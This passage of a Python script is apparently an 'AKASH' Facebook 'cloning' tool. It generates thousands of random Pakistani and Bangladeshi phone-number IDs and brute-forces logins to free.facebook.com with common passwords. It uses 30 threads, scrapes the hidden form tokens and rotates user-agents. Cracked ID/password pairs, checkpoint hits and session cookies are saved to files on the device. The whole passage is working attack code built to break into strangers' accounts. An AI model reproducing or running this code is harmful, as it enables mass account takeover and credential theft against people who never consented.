                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[PASS 5 CLONING MENU]---------------------#
def password5():
    user=[]
    
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ SLOW 🐌]")
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,code+love,'786786','123456','pakistan']
            manshera.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[MAIN CLONING DEF 2]---------------------#


def Tabii2():
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(' 880171 , 880172 , 880173 \n 880174 , 880191 , 880192\n 880193 , 880194 , 880181\n 880182 , 880183 , 880184\n 880161 , 880162 , 880163 ')
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\n {WHITE}TOTAL IDZ             : {RED}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}BANGLADESH 🇧🇩")
        print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
            uid = code+love
            pwx = [love,'786786','123456']
            manshera.submit(m,uid,pwx,tl)
def m(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/𝙰𝙺𝙰𝚂𝙷-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp3")
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp3")
                    print(f'\r\033[1;30m[𝙰𝙺𝙰𝚂𝙷-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s] \33[1;97m[OK:%s{𝙰𝙺𝙰𝚂𝙷2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass



#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    xyz()


